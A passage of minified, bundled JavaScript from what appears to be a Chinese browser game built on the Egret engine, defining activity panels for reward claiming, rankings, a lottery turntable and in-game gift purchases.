t.rp.v},e}(u.ActivityPanel);e.OSATarget42Panel1=p,window.OSATarget42Panel1=p,__reflect(p.prototype,"OSATarget42Panel1",[]);var d=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.createChildren=function(){this.addTouchEvent(this.btn,this.onClick),this.itemList.itemRenderer=s.ItemBase,this.itemList.dataProvider=new eui.ArrayCollection([])},e.prototype.dataChanged=function(){var t=this.data,e=t.targetNum||0,i=t.target;this.lab.textFlow=(new egret.HtmlTextParser).parse("<a > "+e+"/"+i+"</a>"),this.btn.enabled=!t.singal&&e>=i,this.btn.label=this.btn.enabled?gettext("领取"):gettext("未完成"),this.btn.eRp.visible=e>=i&&!t.singal,this.itemList.dataProvider=new eui.ArrayCollection(t.reward),this.eGetImg.visible=t.singal,this.btn.visible=!this.eGetImg.visible,this.desc.textFlow=n.TextFlowMaker.generateTextFlow1(t.desc)},e.prototype.onClick=function(){if(!((this.data.targetNum||0)<this.data.target)){var t=r.BagCT.ins().rockonNeedNum(this.data.reward);return t&&r.BagCT.ins().getAllSurplusCount(t)<0?void l.TipsCT.ins().showTips(gettext("背包剩余空间不足，请扩容")):void h.Activity.ins().sendReward(this.data.activityID,this.data.index)}},e}(o.BaseItemRender);e.OSATarget42Item1=d,window.OSATarget42Item1=d,__reflect(d.prototype,"OSATarget42Item1",[]),window.OSATarget42Item1=d,window.OSATarget42Panel1=p},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OSATarget42Item2=e.OSATarget42Panel2=void 0;var n=i(3),o=i(11),s=i(0),a=i(6),r=i(10),l=i(2),h=i(9),u=i(29),p=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="osa42p2skin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.list.itemRenderer=d,this.list.dataProvider=this.listAc=new eui.ArrayCollection([])},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];observe(this,this.updateView,h.Activity.ins().postRewardResult,h.Activity.ins().postChangePage),this.updateView()},e.prototype.updateView=function(){var t=[],e=s.GlobalConfig.ActivityType42Config[this.activityID],i=h.Activity.ins().activityData[this.activityID];for(var n in e){var o=e[n],a=i.getAchieveInfo(o.index);t.push({activityID:this.activityID,reward:o.reward,gotTimes:null===a||void 0===a?void 0:a.gotTimes,sCount:o.sCount,showTask:o.showTask,target:o.target,singal:null===a||void 0===a?void 0:a.isGot,targetNum:null===a||void 0===a?void 0:a.times,desc:o.name,index:o.index})}t=t.sort(function(t,e){if(t.singal&&e.singal)return t.index-e.index;if(!t.singal&&!e.singal){var i=t.targetNum>=t.target,n=e.targetNum>=e.target;return i&&n?t.index-e.index:!i&&n?1:i&&!n?-1:t.index-e.index}return t.singal&&!e.singal?1:!t.singal&&e.singal?-1:0}),this.listAc.replaceAll(t)},e.prototype.tabRp=function(){var t=h.Activity.ins().activityData[this.activityID];return t.rp.v},e}(u.ActivityPanel);e.OSATarget42Panel2=p,window.OSATarget42Panel2=p,__reflect(p.prototype,"OSATarget42Panel2",[]);var d=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.createChildren=function(){this.addTouchEvent(this.btn,this.onClick),this.itemList.itemRenderer=o.ItemBase,this.itemList.dataProvider=new eui.ArrayCollection([])},e.prototype.dataChanged=function(){var t=this.data,e=t.targetNum||0,i=t.target,n=t.gotTimes?t.gotTimes:0;this.count.text=""+(t.sCount-n),this.itemList.dataProvider=new eui.ArrayCollection(t.reward),this.task.data=t.showTask[0];var o=s.GlobalConfig.ItemConfig[t.showTask[0].id];return this.desc.text=o?o.name:"",this.desc.textColor=r.ItemUtil.getQualityColor(t.showTask[0].quality),this.flusQual(),this.tips.visible=i>e,this.tips.visible?void(this.btn.visible=this.eGetImg.visible=!1):(this.btn.visible=this.eGetImg.visible=!0,this.btn.enabled=!t.singal&&e>=i,this.btn.label=this.btn.enabled?gettext("领取"):gettext("未完成"),this.btn.eRp.visible=e>=i&&!t.singal,this.eGetImg.visible=t.singal,void(this.btn.visible=!this.eGetImg.visible))},e.prototype.flusQual=function(){this.task.setImgBg(this.data.showTask[0].quality)},e.prototype.onClick=function(){if(!((this.data.targetNum||0)<this.data.target)){var t=a.BagCT.ins().rockonNeedNum(this.data.reward);return t&&a.BagCT.ins().getAllSurplusCount(t)<0?void l.TipsCT.ins().showTips(gettext("背包剩余空间不足，请扩容")):void h.Activity.ins().sendReward(this.data.activityID,this.data.index)}},__decorate([delayCall(100)],e.prototype,"flusQual",null),e}(n.BaseItemRender);e.OSATarget42Item2=d,window.OSATarget42Item2=d,__reflect(d.prototype,"OSATarget42Item2",[]),window.OSATarget42Item2=d,window.OSATarget42Panel2=p},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OSATarget42Item3=e.OSATarget42Panel3=void 0;var n=i(5),o=i(3),s=i(11),a=i(0),r=i(6),l=i(58),h=i(2),u=i(9),p=i(29),d=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="osa42p3skin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.list.itemRenderer=c,this.list.dataProvider=this.listAc=new eui.ArrayCollection([]);var t=a.GlobalConfig.ActivityBtnConfig[this.activityID];this.titleImg.source=t.titleImg,this.bannerImg.source=t.bannerImg},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];observe(this,this.updateView,u.Activity.ins().postRewardResult,u.Activity.ins().postChangePage),this.updateView()},e.prototype.updateView=function(){var t=[],e=a.GlobalConfig.ActivityType42Config[this.activityID],i=u.Activity.ins().activityData[this.activityID];for(var n in e){var o=e[n],s=i.getAchieveInfo(o.index);t.push({activityID:this.activityID,reward:o.reward,target:o.target,singal:null===s||void 0===s?void 0:s.isGot,targetNum:null===s||void 0===s?void 0:s.times,desc:o.name,index:o.index})}t=t.sort(this.sortReward.bind(this)),this.listAc.replaceAll(t)},e.prototype.tabRp=function(){var t=u.Activity.ins().activityData[this.activityID];return t.rp.v},e.prototype.sortReward=function(t,e){var i=t.targetNum||0,n=t.target,o=t.singal||!1,s=e.targetNum||0,a=e.target,r=e.singal||!1;return o||r?o&&!r?1:!o&&r?-1:0:i>=n&&s>=a?0:i>=n&&a>s?-1:n>i&&s>=a?1:0},e}(p.ActivityPanel);e.OSATarget42Panel3=d,window.OSATarget42Panel3=d,__reflect(d.prototype,"OSATarget42Panel3",[]);var c=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.createChildren=function(){this.addTouchEvent(this.btn,this.onClick),this.itemList.itemRenderer=s.ItemBase,this._itemArr=new eui.ArrayCollection,this.itemList.dataProvider=this._itemArr},e.prototype.dataChanged=function(){var t=this.data,e=t.targetNum||0,i=t.target;this.btn.enabled=!t.singal&&e>=i,this.btn.label=this.btn.enabled?gettext("领取"):gettext("未完成"),this.btn.eRp.visible=e>=i&&!t.singal,this._itemArr.source=t.reward,this.eGetImg.visible=t.singal,this.btn.visible=!this.eGetImg.visible,this.desc.textFlow=n.TextFlowMaker.generateTextFlow1(l.LangUtils.formatStr(t.desc,[e>=i?"|C:0x0F8E05&T:"+e+"/"+i+"|":"|C:0xff0000&T:"+e+"/"+i+"|"]))},e.prototype.onClick=function(){if(!((this.data.targetNum||0)<this.data.target)){var t=r.BagCT.ins().rockonNeedNum(this.data.reward);return t&&r.BagCT.ins().getAllSurplusCount(t)<0?void h.TipsCT.ins().showTips(gettext("背包剩余空间不足，请扩容")):void u.Activity.ins().sendReward(this.data.activityID,this.data.index)}},e}(o.BaseItemRender);e.OSATarget42Item3=c,window.OSATarget42Item3=c,__reflect(c.prototype,"OSATarget42Item3",[]),window.OSATarget42Item3=c,window.OSATarget42Panel3=d},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OSATarget42Item4=e.OSATarget42Panel4=void 0;var n=i(5),o=i(3),s=i(269),a=i(0),r=i(6),l=i(58),h=i(2),u=i(9),p=i(29),d=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="osa42p4skin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.list0.itemRenderer=c,this.list0.dataProvider=this.listAc=new eui.ArrayCollection([]);var t=a.GlobalConfig.ActivityBtnConfig[this.activityID];this.titleImg.source=t.titleImg,this.bannerImg.source=t.bannerImg},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];observe(this,this.updateView,u.Activity.ins().postRewardResult,u.Activity.ins().postChangePage),this.updateView()},e.prototype.updateView=function(){var t=[],e=a.GlobalConfig.ActivityType42Config[this.activityID],i=u.Activity.ins().activityData[this.activityID],n=0,o=0;for(var s in e){var r=e[s],l=i.getAchieveInfo(r.index);t.push({activityID:this.activityID,reward:r.reward,target:r.target,singal:null===l||void 0===l?void 0:l.isGot,targetNum:null===l||void 0===l?void 0:l.times,desc:r.name,index:r.index,idx:o}),o++,n=(null===l||void 0===l?void 0:l.times)||0}this.listAc.replaceAll(t),this.num.text=n+""},e.prototype.tabRp=function(){var t=u.Activity.ins().activityData[this.activityID];return t.rp.v},e}(p.ActivityPanel);e.OSATarget42Panel4=d,window.OSATarget42Panel4=d,__reflect(d.prototype,"OSATarget42Panel4",[]);var c=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.createChildren=function(){this.addTouchEvent(this.btnGet0,this.onClick),this.itemList0.itemRenderer=s.ItemBaseEff5,this._itemArr=new eui.ArrayCollection,this.itemList0.dataProvider=this._itemArr},e.prototype.dataChanged=function(){var t=this.data,e=t.targetNum||0,i=t.target,o=t.idx||0;this.currentState=o%2==0?"p1":"p2",this.btnGet0.enabled=!t.singal&&e>=i,this.btnGet0.label=this.btnGet0.enabled?gettext("领取"):gettext("未完成"),this.btnGet0.showRed.visible=e>=i&&!t.singal,this._itemArr.source=t.reward,this.eGetImg0.visible=t.singal,this.btnGet0.visible=!this.eGetImg0.visible,this.desc0.textFlow=n.TextFlowMaker.generateTextFlow1(l.LangUtils.formatStr(t.desc,[e>=i?"|C:0xffffff&T:"+i+"|":"|C:0xffffff&T:"+i+"|"]))},e.prototype.onClick=function(){if(!((this.data.targetNum||0)<this.data.target)){var t=r.BagCT.ins().rockonNeedNum(this.data.reward);return t&&r.BagCT.ins().getAllSurplusCount(t)<0?void h.TipsCT.ins().showTips(gettext("背包剩余空间不足，请扩容")):void u.Activity.ins().sendReward(this.data.activityID,this.data.index)}},e}(o.BaseItemRender);e.OSATarget42Item4=c,window.OSATarget42Item4=c,__reflect(c.prototype,"OSATarget42Item4",[]),window.OSATarget42Item4=c,window.OSATarget42Panel4=d},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OSATarget49Panel=void 0;var n=i(24),o=i(1),s=i(0),a=i(9),r=i(568),l=function(t){function e(){var e=t.call(this)||this;return e._sn_="AppearanceLeaseSkin",e.isTopLevel=!0,e.updateFin=!0,e}return __extends(e,t),e.prototype.skinComplete=function(){this.listDP=new eui.ArrayCollection,this.eList.dataProvider=this.listDP,this.eList.itemRenderer=r.OSATarget49ItemRender,this.addTouchEvent(this,this.onClick)},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.observe(a.Activity.ins().postActivityIsGetAwards,this.update),this.update()},e.prototype.update=function(){this.updateFin&&(this.updateFin=!1,this.data=a.Activity.ins().activityData[this.activityID],this.setTime(),this.updateView())},e.prototype.updateView=function(){var t=s.GlobalConfig.ActivityType49Config[this.activityID];this.listDP.replaceAll(n.CommonUtils.objectToArray(t).concat([])),this.updateFin=!0},e.prototype.onClick=function(t){switch(t.target){case this.eClose:win.close(this)}},e.prototype.setTime=function(){this.sTime=this.data.getRemainTime()},e}(o.BaseView);e.OSATarget49Panel=l,window.OSATarget49Panel=l,__reflect(l.prototype,"OSATarget49Panel",[]),window.OSATarget49Panel=l},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OSATarget4Panel=void 0;var n=i(29),o=i(9),s=i(0),a=i(203),r=i(128),l=i(10),h=i(88),u=i(4),p=i(270),d=i(71),c=function(t){function e(){var e=t.call(this)||this;return e._sn_="osa4pskin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.eList.itemRenderer=p.OSATarget4Item,this.eList.dataProvider=this.listDP=new eui.ArrayCollection},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.addTouchEvent(this,this.onClick),observe(this,this.updateData,o.Activity.ins().postGetDaBiaoInfo),observe(this,this.initInfo,h.Rank.ins().postRankingData),this.cfg=s.GlobalConfig.ActivityType4Config[this.activityID];var i=this.cfg[1];i&&i.rankType==d.RankDataType.TYPE_HF_XIAOFEI?o.Activity.ins().sendDabiaoInfo(this.activityID):h.Rank.ins().sendGetRankingData(i.rankType)},e.prototype.initInfo=function(t){this.model=t,this.updateData()},e.prototype.updateData=function(){this.actData=o.Activity.ins().getActivityDataById(this.activityID),this.updateView(),this.updateList()},e.prototype.updateList=function(){var t;this.cfg[0].rankType;if(t=this.model?this.model.getDataList():o.Activity.ins().rankInfoList){var e=[];for(var i in t)for(var n in this.cfg)if(this.cfg[n].ranking&&!e[this.cfg[n].ranking]&&this.cfg[n].value<=t[i].value){t[i].realPos=this.cfg[n].ranking,e[this.cfg[n].ranking]=t[i];break}var s,a=[];for(var n in this.cfg)this.cfg[n].ranking&&(a.push([this.cfg[n],e[+n]]),e[+n]&&e[+n].id==u.ActorCC.actorID&&(s=e[+n].realPos));this.listDP.replaceAll(a),this.eMyLab.text=this.eMyRank.text="",s?this.eMyLab.text=s+"":this.eMyRank.text=gettext("{0}名以后",20)}},e.prototype.updateView=function(){this.eImg.source="act4_t"+this.cfg[0].rankType,this.cfg[0].titleEffName?(this.eMc.data=RES_DIR_EFF+this.cfg[0].titleEffName,this.eTitleImg.source=""):(this.eMc.data=null,this.eTitleImg.source=RES_DIR_CHENGHAO+this.cfg[0].titleName);var t=Object.keys(this.cfg).length-1,e="";if(this.cfg[t].value&&(e+=gettext("上榜前{0}且{1}达到\n{2}\n可获得排名奖励-绝版称号",t,a.ActivityType4Data.getTypeDesc(this.activityID),a.ActivityType4Data.getTarStr(this.cfg[t]))),this.eTips1.text=e,e="",this.cfg[1].rewards2){var i=this.cfg[1],n=i.rewards2[0].id,o=s.GlobalConfig.ItemConfig[n],h=r.Title.getTitleCfgByItemId(o.id),u=l.ItemUtil.getAttrPower(h.attrs),p=[];h.sysadd?h.sysadd.length:0;e=gettext("第一名:{0}\n战力+{1}\n{2}",o.name,u,p)}if(this.eTips2.text=e,e="",this.cfg[t].rewards2){var n=this.cfg[1].rewards2[0].id,o=s.GlobalConfig.ItemConfig[n],h=r.Title.getTitleCfgByItemId(o.id),u=l.ItemUtil.getAttrPower(h.attrs),p=[];h.sysadd?h.sysadd.length:0;e=gettext("前{0}名:{1}\n战力+{2}\n{3}",t,o.name,u,p)}this.eTips3.text=e},e.prototype.onClick=function(t){switch(t.target){case this.eBtn:this.cfg[0].turn&&win.open(this.cfg[0].turn[0],this.cfg[0].turn.slice(1))}},e}(n.ActivityPanel);e.OSATarget4Panel=c,window.OSATarget4Panel=c,__reflect(c.prototype,"OSATarget4Panel",[]),window.OSATarget4Panel=c},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OSATarget52Panel=void 0;var n=i(21),o=i(18),s=i(5),a=i(0),r=i(4),l=i(6),h=i(2),u=i(9),p=i(29),d=i(569),c=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="CDGoodluckTurntableSkin",e.latterTime=100,e}return __extends(e,t),e.prototype.skinComplete=function(){this.eTips.textFlow=(new egret.HtmlTextParser).parser("<u>"+this.eTips.text+"</u>"),this.eTips.touchEnabled=!0,this.listDP=new eui.ArrayCollection,this.list.itemRenderer=d.OSATarget52ItemRender,this.list.dataProvider=this.listDP,this.mcUp=new n.MovieClip,this.mcUp.playFile(RES_DIR_EFF+"hongyun",-1),this.mcDown=new n.MovieClip,this.mcDown.playFile(RES_DIR_EFF+"hongyun",-1),this.mcDown.scaleX=-1,this.eUpGroup.addChild(this.mcUp),this.eDownGroup.addChild(this.mcDown)},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.config=a.GlobalConfig.ActivityType52Config,observe(this,this.resultCallBack,u.Activity.ins().postRewardResult),this.observe(u.Activity.ins().postAddTips52,this.updateData),this.addTouchEvent(this,this.onClick),this.updateData()},e.prototype.updateData=function(){var t=this;this.actData=u.Activity.ins().activityData[this.activityID];var e=this.config[this.activityID][0],i=a.GlobalConfig.ItemConfig[e.item];if(i){this.icon.source=i.icon+"_png";var n=l.BagCT.ins().getBagItemById(i.id),r=0,h=1,p=13746831;n?(r=n.count,p=r>=h?o.ColorUtil.GREEN:o.ColorUtil.RED):p=o.ColorUtil.RED,this.num.textFlow=s.TextFlowMaker.generateTextFlow1("|C:"+p+"&T:"+r+"|C:0xD1C28F&T:/"+h)}var d=function(e){if(!+e)return"continue";var i=c.config[c.activityID][e];setTimeout(function(){var n=t["item"+(+e-1)];n&&n.itemIcon&&(n.itemIcon.data=i.showReward),n.rewardState(!1),t.latterTime=0},c.latterTime)},c=this;for(var f in this.config[this.activityID])d(f);this.totalPower.text=this.actData.totoYb+"",this.listDP.source=this.actData.tips},e.prototype.resultCallBack=function(t){this.actData=u.Activity.ins().activityData[this.activityID],this.actData&&this.activityID==t.activityID&&(this.actData.indexs.length>1?win.open("LuckyResultWinEx",this.activityID,this.actData.indexs):1==this.actData.indexs.length&&this.beginLottery(this.actData.indexs[0]),this.updateData())},e.prototype.enterFrame=function(){this.sTime1=this.actData?this.actData.getRemainTime():""},e.prototype.onClick=function(t){var e;switch(t.target){case this.choujiangBtn:this.getLottery();break;case this.eTips:var i=this.config[this.activityID][0];win.open("ShowChanceWin",i.showReward);break;case this.probability:var n=a.GlobalConfig.HelpInfoConfig[null===(e=this.config[this.activityID][0])||void 0===e?void 0:e.dropShow];win.open("CommonHelpWin",(null===n||void 0===n?void 0:n.text)||"")}},e.prototype.beginLottery=function(t){var e=this,i=1440+22.5*(t-1),n=egret.Tween.get(this.tttzhi);this.rolling=!0,n.to({rotation:i},4e3,egret.Ease.circOut).call(function(){u.Activity.ins().sendReward(e.activityID,1,2);var i=a.GlobalConfig.ItemConfig[e.actData.itemList[0].id];i?e.flyItem(e["item"+(t-1)],e.actData.itemList[0]):e.flyItem(e["item"+(t-1)]),setTimeout(function(){e.rolling=!1},2e3)},this)},e.prototype.flyItem=function(t,e){},e.prototype.getLottery=function(){if(this.rolling)return void h.TipsCT.ins().showTips(gettext("正在抽奖，请稍候"));if(l.BagCT.ins().getSurplusCount()<l.BagCT.BAG_ENOUGH)return void win.open("BagFullTipsWin");var t=this.config[this.activityID][0];if(t){if(r.ActorCC.level<t.lvLimit)return void h.TipsCT.ins().showTips(gettext("{0}级后开启抽奖权限",t.lvLimit));if(this.turnten.selected){var e=l.BagCT.ins().getBagGoodsByTypeAndId(l.BagCT.BAG_TYPE_OTHTER,t.item);e&&e.count>=10?u.Activity.ins().sendReward(this.activityID,2):h.TipsCT.ins().showTips(gettext("{0}不足",a.GlobalConfig.ItemConfig[t.item].name))}else{var e=l.BagCT.ins().getBagGoodsByTypeAndId(l.BagCT.BAG_TYPE_OTHTER,t.item);e&&e.count?u.Activity.ins().sendReward(this.activityID,1,1):h.TipsCT.ins().showTips(gettext("{0}不足",a.GlobalConfig.ItemConfig[t.item].name))}}},e.prototype.checkSend10=function(){this.actData&&(this.actData.getIsRollTen(this.activityID)?u.Activity.ins().sendReward(this.activityID,2):h.TipsCT.ins().showTips(gettext("元宝不足")))},e.prototype.checkSend1=function(){this.actData&&(this.actData.getRollSum(this.activityID)||r.ActorCC.yb>=this.config[this.activityID][0].yb?u.Activity.ins().sendReward(this.activityID,1,1):h.TipsCT.ins().showTips(gettext("元宝不足")))},e.prototype.close=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.removeObserve()},e}(p.ActivityPanel);e.OSATarget52Panel=c,window.OSATarget52Panel=c,__reflect(c.prototype,"OSATarget52Panel",[]),window.OSATarget52Panel=c},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OSATarget53Panel=void 0;var n=i(29),o=i(9),s=i(0),a=i(547),r=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="DailyGift",e}return __extends(e,t),e.prototype.skinComplete=function(){this.itemList.itemRenderer=a.DailyGiftTask53Item;var t=o.Activity.ins().getActivityDataById(this.activityID),e=[];for(var i in s.GlobalConfig.ActivityType53Config[this.activityID][t.idx])e.push(s.GlobalConfig.ActivityType53Config[this.activityID][t.idx][i]);this.itemList.dataProvider=this.listDP=new eui.ArrayCollection(e)},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.observe(o.Activity.ins().postChangePage,this.updateData)},e.prototype.changePage=function(t){},e.prototype.updateData=function(){var t=o.Activity.ins().getActivityDataById(this.activityID),e=[];for(var i in s.GlobalConfig.ActivityType53Config[this.activityID][t.idx])e.push(s.GlobalConfig.ActivityType53Config[this.activityID][t.idx][i]);this.listDP.replaceAll(e)},e.prototype.updateList=function(){},e}(n.ActivityPanel);e.OSATarget53Panel=r,window.OSATarget53Panel=r,__reflect(r.prototype,"OSATarget53Panel",[]),window.OSATarget53Panel=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OSATarget55Item=e.OSATarget55Panel1=void 0;var n=i(8),o=i(66),s=i(3),a=i(11),r=i(0),l=i(25),h=i(2),u=i(9),p=i(29),d=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="osa55p1skin",e.actList=[],e}return __extends(e,t),e.prototype.skinComplete=function(){this.list.itemRenderer=c,this.list.dataProvider=this.listAc=new eui.ArrayCollection([])},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.observe(u.Activity.ins().postActivityIsGetAwards,this.update),this.addTouchEvent(this,this.onClick),this.update()},e.prototype.removeDisplay=function(){},e.prototype.update=function(){var t=u.Activity.ins().activityData[this.activityID],e=[],i=r.GlobalConfig.ActivityType55Config[this.activityID];for(var n in i){var o=i[n];e.push({rid:o.rid,activityID:this.activityID,money:o.money,award:o.award,giftname:o.giftname,buyTimes:o.buyTimes,data_state:t.dic[o.index]||0})}this.listAc.replaceAll(e)},e.prototype.onClick=function(t){if(t.target instanceof eui.Button&&t.target.parent.parent instanceof c){var e=this.list.selectedIndex+1,i=r.GlobalConfig.ActivityType55Config[this.activityID][e],o=i?i.rid:0,s=u.Activity.ins().activityData[this.activityID];if(s.dic[e]>=(null===i||void 0===i?void 0:i.buyTimes))return void h.TipsCT.ins().showTips(gettext("购买次数以达上限"));if(o){var a=i?i.buyTimes:0,p=n.DateUtils.formatMiniDateTime(s.startTime),d=n.DateUtils.formatMiniDateTime(s.endTime);if(urlParam.appid){var f=r.GlobalConfig.ActivityConfig[this.activityID];if(f&&f.onlyappid){var g=!1;for(var m in f.onlyappid)urlParam.appid==f.onlyappid[m]&&(g=!0);if(!g)return void(f.onlyappidTip?h.TipsCT.ins().showTips(f.onlyappidTip):h.TipsCT.ins().showTips(gettext("|C:0xf3311e&T:关注公众号转端获得奖励|")))}}l.Recharge.ins().sendPayOrder(o,[o,a,p,d])}}},e}(p.ActivityPanel);e.OSATarget55Panel1=d,window.OSATarget55Panel1=d,__reflect(d.prototype,"OSATarget55Panel1",[]);var c=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.createChildren=function(){this.reward.itemRenderer=a.ItemBase,this.reward.dataProvider=new eui.ArrayCollection([])},e.prototype.dataChanged=function(){this.eName.text=this.data.giftname;for(var t=[],e=0;e<this.data.award.length;e++)e&&t.push(this.data.award[e]);this.reward.dataProvider=new eui.ArrayCollection(t),this.item.data=this.data.award[0];var i=l.Recharge.ins().getCashByRid(this.data.rid)/100;this.buyBtn.label=gettext("充值")+o.PayUtils.getPayUnitStr(i,urlParam.payUnit),this.buyNum.text=gettext("限购{0}/{1}次",this.data.data_state,this.data.buyTimes);var n=this.data.data_state>=this.data.buyTimes;this.buyBtn.visible=!n,this.hasBuy.visible=n},e}(s.BaseItemRender);e.OSATarget55Item=c,window.OSATarget55Item=c,__reflect(c.prototype,"OSATarget55Item",[]),window.OSATarget55Panel1=d,window.OSATarget55Item=c},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OSATarget55Panel2=void 0;var n=i(8),o=i(66),s=i(11),a=i(0),r=i(25),l=i(7),h=i(2),u=i(9),p=i(29),d=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="osa55p2skin",e.actList=[],e.chargeCount=0,e}return __extends(e,t),e.prototype.skinComplete=function(){this.list.itemRenderer=s.ItemBase,this.list.dataProvider=this.listAc=new eui.ArrayCollection([])},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.observe(u.Activity.ins().postActivityIsGetAwards,this.updateData),this.observe(u.Activity.ins().postChangePage,this.updateData),this.addTouchEvent(this,this.onClick),this.observe(u.Activity.ins().postRewardResult,this.GetCallBack),this.observe(u.Activity.ins().postChangePage,this.GetCallBack),Timer.start(1e3,0,this.setTime,this),this.updateData()},e.prototype.removeDisplay=function(){},e.prototype.GetCallBack=function(t){this.updateData()},e.prototype.updateData=function(){var t=a.GlobalConfig.ActivityType55Config[this.activityID][1];this.validateNow(),this.activityData=u.Activity.ins().getActivityDataById(this.activityID),this.desc.source=t.desc;var e=r.Recharge.ins().getCashByRid(t.rid)/100;this.costbtn.label=gettext("充值")+o.PayUtils.getPayUnitStr(e,urlParam.payUnit),this.chargeCount=this.activityData.dic[1],t.buyTimes-this.chargeCount<=0&&(this.costbtn.visible=!1);for(var i=[],n=0;n<t.award.length;n++)i.push(t.award[n]);this.list.dataProvider=new eui.ArrayCollection(i),this.setTime(),this.eTips.text=a.GlobalConfig.ActivityConfig[this.activityID].desc},e.prototype.onClick=function(t){var e=a.GlobalConfig.ActivityType55Config[this.activityID][1];if(e)switch(t.target){case this.costbtn:var i=n.DateUtils.formatMiniDateTime(this.activityData.startTime),o=n.DateUtils.formatMiniDateTime(this.activityData.endTime);if(urlParam.appid){var s=a.GlobalConfig.ActivityConfig[this.activityID];if(s&&s.onlyappid){var l=!1;
for(var u in s.onlyappid)urlParam.appid==s.onlyappid[u]&&(l=!0);if(!l)return void(s.onlyappidTip?h.TipsCT.ins().showTips(s.onlyappidTip):h.TipsCT.ins().showTips(gettext("|C:0xf3311e&T:关注公众号转端获得奖励|")))}}r.Recharge.ins().sendPayOrder(e.rid,[e.rid,e.buyTimes,i,o])}},e.prototype.setTime=function(){var t=Math.floor((n.DateUtils.formatMiniDateTime(this.activityData.startTime)-l.GameServerCC.serverTime)/1e3),e=Math.floor((n.DateUtils.formatMiniDateTime(this.activityData.endTime)-l.GameServerCC.serverTime)/1e3);t>=0?this.actTime.text=gettext("活动未开启"):0>=e?this.actTime.text=gettext("活动已结束"):this.actTime.text=n.DateUtils.getFormatBySecond(e,n.DateUtils.TIME_FORMAT_5,3)},e}(p.ActivityPanel);e.OSATarget55Panel2=d,window.OSATarget55Panel2=d,__reflect(d.prototype,"OSATarget55Panel2",[]),window.OSATarget55Panel2=d},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OSATarget56Panel=void 0;var n=i(0),o=i(9),s=i(570),a=i(29),r=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="osa56pskin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.eList.itemRenderer=s.OSATarget56Item,this.eList.dataProvider=this.listDP=new eui.ArrayCollection},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];observe(this,this.changePage,o.Activity.ins().postActivityIsGetAwards,o.Activity.ins().postChangePage),o.Activity.ins().sendChangePage(this.activityID),this.update()},e.prototype.changePage=function(t){this.activityID==t&&this.update()},e.prototype.update=function(){var t=n.GlobalConfig.ActivityType56Config[this.activityID],e=o.Activity.ins().getActivityDataById(this.activityID),i=[],s=[];for(var a in t){var r=t[a].buyTimeLimit-e.giftData[t[a].giftId];r?i.push(t[a]):s.push(t[a])}var l=i.concat(s);this.listDP.replaceAll(l)},e}(a.ActivityPanel);e.OSATarget56Panel=r,window.OSATarget56Panel=r,__reflect(r.prototype,"OSATarget56Panel",[]),window.OSATarget56Panel=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OSATarget57Panel=void 0;var n=i(26),o=i(11),s=i(0),a=i(9),r=i(4),l=i(21),h=i(204),u=i(29),p=i(571),d=i(572),c=i(64),f=i(239),g=i(252),m=i(2),v=i(7),y=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="osa57pskin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.eItem0.itemRenderer=this.eItem1.itemRenderer=this.eItem2.itemRenderer=o.ItemBase,this.listType.itemRenderer=d.OSATarget57TypeItem,this.listType.dataProvider=this._listTypeArr=new eui.ArrayCollection,this.listBoss.itemRenderer=p.OSATarget57Item,this.listBoss.dataProvider=this._listBossArr=new eui.ArrayCollection,this.effect=new l.MovieClip,this.eff.addChild(this.effect)},e.prototype.addDisplay=function(){for(var 